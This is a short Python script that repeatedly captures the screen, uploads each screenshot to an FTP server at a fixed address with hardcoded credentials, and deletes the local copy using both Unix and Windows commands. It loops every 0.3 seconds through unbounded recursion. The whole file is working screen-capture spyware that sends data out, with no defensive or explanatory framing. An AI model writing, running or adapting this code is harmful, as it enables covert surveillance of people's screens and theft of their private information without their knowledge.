import pyscreenshot as ImageGrab
import ftplib
import time
from base64 import decodebytes
import os

def restartpoint():
    im = ImageGrab.grab()
    im.save("shot.png")
    session = ftplib.FTP('192.168.10.8','win-ftp','secret')
    file = open('shot.png','rb')                  # file to send
    session.storbinary('STOR shot.png', file)     # send the file
    file.close()                                    # close file and FTP
    session.quit()
    os.system("rm shot.png")
    os.system("del shot.png")
    time.sleep(0.3)
    restartpoint()    

restartpoint()
